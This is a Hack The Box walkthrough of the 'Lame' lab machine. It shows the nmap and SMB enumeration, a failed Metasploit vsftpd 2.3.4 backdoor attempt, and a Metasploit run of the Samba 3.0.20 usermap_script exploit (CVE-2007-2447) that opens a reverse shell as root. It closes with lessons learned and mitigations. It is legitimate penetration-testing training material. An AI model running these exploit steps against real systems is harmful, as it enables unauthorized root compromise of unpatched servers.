---
title: "HTB Walkthrough: Lame"
date: 2026-03-28
draft: false
description: "Full walkthrough of the Lame machine from Hack The Box. Easy difficulty, Linux. Remote code execution on Samba 3.0.20 via CVE-2007-2447 (Username Map Script) for direct root access."
tags: ["HackTheBox", "Linux", "Easy", "Samba", "CVE-2007-2447", "Metasploit", "RCE", "lame", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Walkthrough of **Lame**, one of the most classic machines on Hack The Box. **Easy** difficulty running **Linux**. The main vector is a remote code execution vulnerability in **Samba 3.0.20** (CVE-2007-2447) that, through the way Samba processes usernames, executes arbitrary shell commands with the service's privileges — in this case, **root**.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Linux{{< /badge >}}
{{< badge >}}Easy{{< /badge >}}

---

## 🗺️ Machine Info

| Field          | Detail                                               |
|----------------|------------------------------------------------------|
| **Name**       | Lame                                                 |
| **OS**         | Linux                                                |
| **Difficulty** | Easy                                                 |
| **IP**         | 10.129.10.27                                         |
| **Techniques** | SMB Enumeration · CVE-2007-2447 · Command Injection  |
| **CVE**        | CVE-2007-2447                                        |

---

## 1. Reconnaissance

### 1.1 Port Scan

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.10.27
```

```
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

Version scan on open ports:

```bash
nmap -sC -sV -p21,22,139,445 10.129.10.27
```

```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
```

*Open ports:*
- `21` → vsftpd 2.3.4 with **anonymous access enabled**
- `22` → OpenSSH 4.7p1 (old version, no accessible direct exploits)
- `139/445` → **Samba 3.0.20** — a version known for critical RCE vulnerabilities

> **💡 Key detail:** Two very old versions stand out: `vsftpd 2.3.4` (known for a 2011 backdoor) and `Samba 3.0.20` (vulnerable to CVE-2007-2447). Both are candidates, but Samba runs as root on this machine — it's the priority vector.

### 1.2 SMB and FTP Enumeration

We check Samba's shared resources and their permissions:

```bash
smbmap -H 10.129.10.27
```

```
Disk          Permissions   Comment
print$        NO ACCESS     Printer Drivers
tmp           READ, WRITE   oh noes!
opt           NO ACCESS
IPC$          NO ACCESS     IPC Service (lame server (Samba 3.0.20-Debian))
ADMIN$        NO ACCESS     IPC Service (lame server (Samba 3.0.20-Debian))
```

The `tmp` share has read and write permissions without authentication. We inspect it:

```bash
smbclient //10.129.10.27/tmp -N
```

```
smb: \> ls
  .ICE-unix    DH    0  Sat Mar 28 12:54:24 2026
  vmware-root  DR    0  Sat Mar 28 12:54:30 2026
  .X11-unix    DH    0  Sat Mar 28 12:54:50 2026
```

Only system temp files, nothing useful. Anonymous FTP also returns an empty directory. The vector is in the Samba version.

> **💡 Conclusions:** Samba 3.0.20 confirmed, anonymous access to the `tmp` share available. We proceed to exploit CVE-2007-2447 directly.

---

## 2. Exploitation

### 2.1 Failed Attempt — vsftpd 2.3.4 Backdoor

Before going to Samba, we try the known vsftpd 2.3.4 backdoor. This version was compromised in its official repositories in 2011 and included a backdoor that opens port **6200/TCP** when receiving a username ending in `:)`.

```bash
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(vsftpd_234_backdoor) > set RHOSTS 10.129.10.27
msf6 exploit(vsftpd_234_backdoor) > run
```

```
[!] 10.129.10.27:21 - Unable to connect to backdoor on 6200/TCP.
[*] Exploit completed, but no session was created.
```

The backdoor doesn't respond. Although the version is vulnerable, port 6200 is blocked at the network level or the binary was patched on this machine. We move to plan B.

### 2.2 Vulnerability Analysis — CVE-2007-2447

**Samba 3.0.20** is vulnerable to this CVE through the `username map script` option in `smb.conf`. When active, Samba allows passing the username to an external script for identity mapping. The problem: **it doesn't sanitize input before passing it to the shell**. If the username contains shell metacharacters like `` ` `` or `$()`, Samba executes them directly on the operating system.

```
Normal flow:    client sends username → Samba maps with external script → authenticates
Malicious flow: client sends "/`command`" → Samba executes the command on the OS → RCE
```

The Samba process on this machine runs as `root`, so any injected command executes with maximum privileges with no need for post-exploitation escalation.

### 2.3 Execution

```bash
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(usermap_script) > set RHOSTS 10.129.10.27
msf6 exploit(usermap_script) > set LHOST tun0
msf6 exploit(usermap_script) > run
```

```
[*] Started reverse TCP handler on 10.10.15.237:4444
[*] Command shell session 1 opened (10.10.15.237:4444 -> 10.129.10.27:49024)
```

```bash
id
uid=0(root) gid=0(root)
```

✅ **Shell obtained directly as root.**

---

## 3. User Flag

```bash
cat /home/makis/user.txt
```

> 🔑 User flag obtained.

---

## 4. Root Flag

No privilege escalation needed — CVE-2007-2447 delivers root directly due to the context in which Samba runs.

```bash
cat /root/root.txt
```

> 🏁 Root flag obtained.

---

## 5. Summary and Lessons Learned

**Compromise path:**

1. **Recon** → Nmap detects vsftpd 2.3.4 and **Samba 3.0.20** with anonymous access.
2. **SMB enumeration** → `tmp` share with READ/WRITE permissions, no useful files.
3. **vsftpd backdoor** → Attempted, failed — port 6200 blocked at the network level.
4. **CVE-2007-2447** → Username Map Script in Samba 3.0.20 → command injection → direct shell as **root**.
5. **Flags** → No escalation needed, direct access to both directories → `user.txt` + `root.txt`.

**What I learned from this machine:**

- **Identifying specific service versions matters more than identifying ports.** An open port 445 is generic; `Samba 3.0.20` is a CVE directly. The difference between `-sV` and not using it can be the difference between finding the vector or not.

- **Always have a plan B when multiple services are vulnerable.** The vsftpd backdoor was the apparently simplest vector, but it was blocked. Without the Samba hint as an alternative, the machine would have seemed unsolvable.

- **CVE-2007-2447 is a classic example of command injection through lack of sanitization.** The `username map script` parameter accepts user input and passes it to the shell without escaping metacharacters. Any external data reaching a command interpreter without sanitization is an injection vector — a universal rule.

- **The context in which a service runs determines the impact of exploiting it.** If Samba ran as an unprivileged user, we'd need escalation. Running as root, the first access is already maximum access. When enumerating a service, it's always worth identifying which user it runs as (`ps aux`, systemd unit files, etc.).

**Mitigations:**

| Vector | Mitigation |
|--------|------------|
| Samba 3.0.20 (CVE-2007-2447) | Update to a modern version with active support |
| `username map script` enabled | Disable this option in `smb.conf` if not strictly necessary |
| Samba running as root | Run Samba with an unprivileged service user |
| Anonymous FTP enabled | Disable unauthenticated access even if the directory is empty |
| Ports 139/445 exposed on the network | Restrict SMB access to trusted IPs via firewall |
